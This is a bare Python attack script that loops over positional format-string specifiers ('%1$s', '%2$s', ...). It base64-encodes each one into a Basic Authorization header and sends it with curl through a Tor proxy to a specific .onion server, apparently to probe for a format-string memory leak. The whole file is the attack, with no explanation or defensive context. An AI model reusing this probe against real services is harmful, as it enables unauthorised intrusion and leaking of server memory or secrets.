import base64
import os
import time

i = 1
while 1:
    print("i = " + str(i))
    s = "%"+str(i)+"$s"
    auth = s + ":"
    curl = "curl --max-time 2 --socks5-hostname 127.0.0.1:9050 -I 'http://zwt6vcp6d5tao7tbe3je6a2q4pwdfqli62ekuhjo55c7pqlet3brutqd.onion/' -H 'Authorization: Basic "+ base64.b64encode(auth.encode()).decode("utf-8") +"'"
    os.system(curl)
    i = i + 1
    time.sleep(0.5)

